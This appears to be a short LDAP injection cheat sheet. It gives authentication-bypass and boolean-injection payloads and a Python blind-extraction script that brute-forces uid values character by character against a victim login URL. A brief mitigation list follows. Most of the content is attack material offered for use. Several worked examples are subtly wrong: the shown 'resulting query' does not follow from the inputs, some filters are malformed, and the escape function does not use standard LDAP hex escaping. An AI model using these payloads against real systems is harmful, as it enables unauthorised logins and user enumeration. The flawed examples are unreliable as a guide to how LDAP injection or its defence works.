# LDAP Injection for Authentication Bypass

Exploiting LDAP queries that don't sanitize user input to bypass authentication.

## Authentication Bypass

```text
# Vulnerable query:
searchFilter = f"(uid={username})(userPassword={password})"

# Bypass with wildcard:
username = admin)(
password = )(|(uid=*

# Resulting query:
(uid=admin)()(|(uid=*)(userPassword=))(|(uid=*)
# Always true -> authentication bypassed
```

## Common Payloads

```text
# Bypass login
username: *
password: *
# Query: (uid=*)(userPassword=*) -> matches any user

# Boolean injection
username: admin)(&
password: )(&
# Query: (uid=admin)(&(userPassword=)(& -> always true

# Extract data via blind LDAP
username: admin)(uid=*
# Enumerate: a*, b*, c* ... to extract usernames char by char
```

## Blind LDAP Extraction

```python
import requests
import string

target = "https://victim.com/login"
charset = string.ascii_lowercase + string.digits

def extract(attribute, known=""):
    for c in charset:
        # If response differs, char is correct
        payload = f"admin)({attribute}={known}{c}*"
        r = requests.post(target, data={"user": payload, "pass": "*"})
        if "Welcome" in r.text:  # success indicator
            return c
    return None

# Extract DN
dn = ""
while True:
    c = extract("uid", dn)
    if not c:
        break
    dn += c
    print(f"uid: {dn}")
```

## Mitigation

- Escape special chars: `\`, `*`, `(`, `)`, `\x00`
```python
def ldap_escape(s):
    special = '\\*()\x00'
    return ''.join(f'\\{c}' if c in special else c for c in s)
```
- Use parameterized LDAP queries
- Use bind authentication (not search+compare)
